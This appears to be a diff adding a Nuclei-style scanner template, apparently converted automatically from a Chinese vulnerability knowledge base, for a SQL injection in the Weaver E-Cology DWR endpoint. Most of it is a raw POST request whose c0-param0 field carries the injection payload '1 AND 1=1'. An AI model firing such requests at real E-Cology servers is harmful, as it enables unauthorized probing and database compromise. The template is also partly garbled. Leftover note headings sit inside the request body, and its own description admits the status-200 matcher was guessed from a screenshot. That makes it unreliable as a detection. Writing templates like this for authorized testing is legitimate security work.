@@ -1,0 +1,77 @@
+id: poc-xnyz5gh99dbuyz8v
+info:
+  name: 泛微 E-Cology 某版本 SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xnyz5gh99dbuyz8v
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xnyz5gh99dbuyz8v
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
+
+
+    Connection: close
+
+
+    Content-Type: text/plain
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    callCount=1
+
+
+    page=
+
+
+    httpSessionId=
+
+
+    scriptSessionId=
+
+
+    c0-scriptName=DocDwrUtil
+
+
+    c0-methodName=ifNewsCheckOutByCurrentUser
+
+
+    c0-id=0
+
+
+    c0-param0=string:1 AND 1=1
+
+
+    c0-param1=string:1
+
+
+    batchId=0
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
